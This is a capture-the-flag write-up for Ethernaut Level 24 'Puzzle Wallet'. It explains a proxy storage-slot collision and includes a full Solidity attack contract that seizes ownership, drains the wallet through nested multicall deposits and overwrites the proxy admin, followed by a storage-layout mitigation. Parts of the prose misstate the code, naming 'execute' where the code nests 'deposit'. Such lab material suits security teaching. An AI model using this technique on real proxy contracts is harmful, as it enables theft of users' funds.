@@ -1,0 +1,118 @@
+---
+title: Level 24 - Puzzle Wallet
+slug: level-24
+published: 06-04-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut24.svg
+---
+
+## Objectives
+
+- Become `admin` of the proxy.
+
+## Vulnerabilities
+
+### Different storage variables between proxy and logic contracts
+
+The `PuzzleProxy` and `PuzzleWallet` contracts don't have the same storage variables. This is dangerous since
+a proxy uses `delegatecall` which can cause the proxy's storage slots to be **overwritten** using the `PuzzleWallet`'s logic.
+
+## Exploit
+
+1. Write and deploy the following `PuzzleWalletHack` contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+pragma experimental ABIEncoderV2;
+
+interface IWallet {
+    function admin() external view returns (address);
+    function whitelisted(address addr) external view returns (bool);
+    function balances(address addr) external view returns (uint256);
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function setMaxBalance(uint256 _maxBalance) external;
+}
+
+contract PuzzleWalletHack {
+    IWallet target;
+
+    constructor(address _targetAddress) {
+        target = IWallet(_targetAddress);
+    }
+
+    function getWhiteListed() external {
+        target.proposeNewAdmin(address(this));
+        target.addToWhitelist(address(this));
+        require(target.whitelisted(address(this)), "Get WhiteListed failed!");
+    }
+
+    function emptyTargetBalance() external payable {
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
+
+        bytes[] memory data = new bytes[](2);
+        data[0] = deposit_data[0];
+        data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
+
+        target.multicall{value: 0.001 ether}(data);
+
+        target.execute(msg.sender, 0.002 ether, "");
+        require(target.balances(address(this)) == 0, "Empty balance failed!");
+    }
+
+    function becomeAdmin() external {
+        target.setMaxBalance(uint256(uint160(msg.sender)));
+        require(target.admin() == msg.sender, "Overwrite admin failed!");
+        selfdestruct(payable(msg.sender));
+    }
+}
+```
+
+The hack logic was split in three different functions but could have all been included inside the constructor.
+
+2. Call `getWhiteListed`. This function does two things:
+
+First it calls `proposeNewAdmin(address(this))` from the _proxy contract_. This sets the _hack contract_'s address as `pendingAdmin`. This
+values is stored in **slot 0**. This slot **collides** with the `owner` varaible of the _logic contract_. We have therefore
+changed that value also making our hack contract **the new owner**!
+
+Second, it calls `addToWhitelist(address(this))` from the _logic contract_. This function has the `onlyOwner` modifer as its
+only _access control_. Since the _hack contract_'s address is now the owner, it sets the _contract address_ as `whitelisted`.
+
+3. Call `emptyTargetBalance` with a value of at least 0.002 Eth. The goal here is to empty the balance of _PuzzleWallet_. The expoit we use is making one transaction
+   with `value` and withdrawing the amount twice using `multicall`.
+
+   `execute` is the function used to witdraw Eth from the _logic contract_.
+
+   `multicall` is a function that enables us to make multiple function calls at once on the _logic contract_ with a single
+   `msg.amount`. A `require` function verifies that `execute` is not called twice. The exploit relies in calling `multicall`
+   with `execute` followed by `multicall` with `execute` as it's parameter. Nested `delegatecall`s share the same `msg.value`
+   but can execute logic in different places.
+
+   If the transaction is successful, the balance of the _logic contract_ is now 0.
+
+4. Call `becomeAdmin`. This function calls `setMaxBalance(uint256(uint160(msg.sender)))` which changes `maxBalance` to a uint256
+   with the 20bytes of the _hack contract_ address as it's rightmost bytes. This variable is in slot 1 which overrites `admin` of
+   the _proxy contract_. This statisfies the goal of this challenge!
+
+## Suggested mitigation
+
+1. Start `PuzzleWallet` with the storage variable of `PuzzleProxy` and only then, add it's own valriables.
+
+```solidity
+contract PuzzleWallet {
+    address public pendingAdmin;
+    address public admin;
+    address public owner;
+    uint256 public maxBalance;
+    mapping(address => bool) public whitelisted;
+    mapping(address => uint256) public balances;
+
+    // Rest of the contract code...
+}
+```
